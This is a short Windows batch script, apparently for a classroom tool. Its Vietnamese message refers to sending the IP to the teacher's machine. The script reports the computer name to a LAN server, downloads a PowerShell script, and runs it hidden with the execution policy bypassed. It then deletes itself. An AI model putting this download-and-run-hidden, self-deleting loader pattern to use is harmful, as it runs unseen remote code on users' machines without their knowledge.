@echo off
set pcname=%COMPUTERNAME%
set res=
for /f "delims=" %%r in ('curl -s "http://192.168.1.182:5000/nhan_ip?pc=%pcname%&user_id=1"') do set res=%%r
curl -s -o "%TEMP%\ThuDiem_Flash.ps1" "http://192.168.1.182:5000/tools/ThuDiem_Flash.ps1"
start "" /min powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "%TEMP%\ThuDiem_Flash.ps1" -Watch -Server http://192.168.1.182:5000
timeout /t 3
if "%res%"=="OK" goto selfdel
echo Khong gui duoc IP ve may thay. Kiem tra mang roi chay lai file nay.
pause
exit
:selfdel
(goto) 2>nul & del "%~f0" & exit
